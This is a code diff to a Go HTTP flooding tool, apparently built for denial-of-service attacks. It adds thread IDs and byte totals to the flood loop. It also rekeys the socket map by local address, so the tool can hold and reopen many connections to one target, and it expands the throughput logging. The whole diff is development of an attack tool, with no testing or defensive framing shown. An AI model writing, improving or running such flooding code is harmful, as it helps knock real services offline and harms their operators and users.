@@ -16,6 +16,7 @@ type HttpFlooder struct {
 	Interval int    // interval per request batch
 	Secure   bool   // https or not
 	Sockets  int    // how many sockets to use
+	ThreadID int    // current thread id
 }
 
 func GenerateRandomUserAgent() string {
@@ -211,6 +212,7 @@ func GenerateRandomRequests(host string) []string {
 }
 
 func (flooder *HttpFlooder) Flood() {
+	var total int64 = 0
 	var secureSuccess int = 0
 	sockets := make(map[string]net.Conn)
 
@@ -259,7 +261,7 @@ func (flooder *HttpFlooder) Flood() {
 					continue
 				}
 
-				sockets[conn.RemoteAddr().String()] = conn
+				sockets[conn.LocalAddr().String()] = conn
 			}
 		}
 
@@ -283,7 +285,7 @@ func (flooder *HttpFlooder) Flood() {
 
 				// assuming that the server forcefully closed our socket
 				conn.Close()
-				delete(sockets, conn.RemoteAddr().String())
+				delete(sockets, conn.LocalAddr().String())
 
 				conn, err = net.Dial("tcp", combineHost(flooder.Host, flooder.Port))
 				if err != nil {
@@ -291,10 +293,11 @@ func (flooder *HttpFlooder) Flood() {
 					break
 				}
 
-				sockets[conn.RemoteAddr().String()] = conn
+				sockets[conn.LocalAddr().String()] = conn
 				continue
 			}
-			print_sumthin("Sent/s: "+strconv.FormatFloat(float64(n)/time.Since(start).Seconds(), 'f', 2, 64)+"B", INFO)
+			total += int64(n)
+			print_sumthin("Thread: "+strconv.FormatInt(int64(flooder.ThreadID), 10)+" | Sent/s: "+strconv.FormatFloat(float64(n)/time.Since(start).Seconds(), 'f', 2, 64)+"B | Total: "+strconv.FormatInt(total, 10)+"B | Sockets: "+strconv.FormatInt(int64(len(sockets)), 10), INFO)
 		}
 
 		if flooder.Interval > 0 {
